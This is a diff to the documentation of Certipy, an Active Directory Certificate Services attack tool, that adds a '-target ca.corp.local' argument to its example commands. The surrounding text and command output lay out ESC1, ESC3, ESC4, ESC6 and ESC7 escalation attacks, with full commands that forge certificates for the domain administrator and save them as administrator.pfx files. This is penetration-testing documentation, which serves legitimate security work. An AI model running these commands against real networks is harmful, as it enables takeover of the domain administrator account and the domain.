@@ -232,7 +232,7 @@ To request a certificate, you must specify the name and host/IP of a Certificate
 In this example, we request a certificate from the CA `corp-CA` based on the template `User`.
 
 ```bash
-$ certipy req -username john@corp.local -password Passw0rd -ca CORP-DC-CA -target ca.corp.local -template User
+$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -532,7 +532,7 @@ ESC1 is when a certificate template permits Client Authentication and allows the
 For ESC1, we can request a certificate based on the vulnerable certificate template and specify an arbitrary UPN or DNS SAN with the `-upn` and `-dns` parameter, respectively.
 
 ```bash
-$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -template ESC1-Test -upn administrator@corp.local -dns dc.corp.local
+$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1-Test -upn administrator@corp.local -dns dc.corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -575,7 +575,7 @@ ESC3 is when a certificate template specifies the Certificate Request Agent EKU 
 First, we must request a certificate based on the vulnerable certificate template ESC3.
 
 ```bash
-$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -template ESC3-Test
+$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC3-Test
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -589,7 +589,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 We can then use the Certificate Request Agent certificate (`-pfx`) to request a certificate on behalf of other another user by specifying the `-on-behalf-of`. The `-on-behalf-of` parameter value must be in the form of `domain\user`, and not the FQDN of the domain, i.e. `corp` rather than `corp.local`.
 
 ```bash
-$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -template User -on-behalf-of 'corp\Administrator' -pfx john.pfx
+$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -on-behalf-of 'corp\Administrator' -pfx john.pfx
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -636,7 +636,7 @@ The certificate template is now vulnerable to the ESC1 technique.
 Therefore, we can now request a certificate based on the ESC4 template and specify an arbitrary SAN with the `-upn` or `-dns` parameter.
 
 ```bash
-$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -template ESC4-Test -upn administrator@corp.local
+$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -665,7 +665,7 @@ ESC6 is when the CA specifies the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. This fl
 The attack is the same as ESC1, except that you can choose any certificate template that permits client authentication. After the May 2022 security updates, new certificates will have a securiy extension that embeds the requester's `objectSid` property. For ESC1, this property will be reflected from the SAN specified, but with ESC6, this property reflects the requester's `objectSid`, and not from the SAN. Notice that the objectSid changes depending on the requester in the following example.
 
 ```bash
-$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -template User -upn administrator@corp.local
+$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -675,7 +675,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 [*] Certificate object SID is 'S-1-5-21-2496215469-2694655311-2823030825-1103'
 [*] Saved certificate and private key to 'administrator.pfx'
 
-$ certipy req -username administrator@corp.local -password Passw0rd! -ca corp-DC-CA -template User -upn administrator@corp.local
+$ certipy req -username administrator@corp.local -password Passw0rd! -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -727,7 +727,7 @@ If we have fulfilled the prerequisites for this attack, we can start by requesti
 This request will be denied, but we will save the private key and note down the request ID.
 
 ```bash
-$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -template SubCA -upn administrator@corp.local
+$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
@@ -750,7 +750,7 @@ Certipy v4.0.0 - by Oliver Lyak (ly4k)
 And finally, we can retrieve the issued certificate with the `req` command and the `-retrieve <request ID>` parameter.
 
 ```bash
-$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -retrieve 785
+$ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
 Certipy v4.0.0 - by Oliver Lyak (ly4k)
 
 [*] Rerieving certificate with ID 785
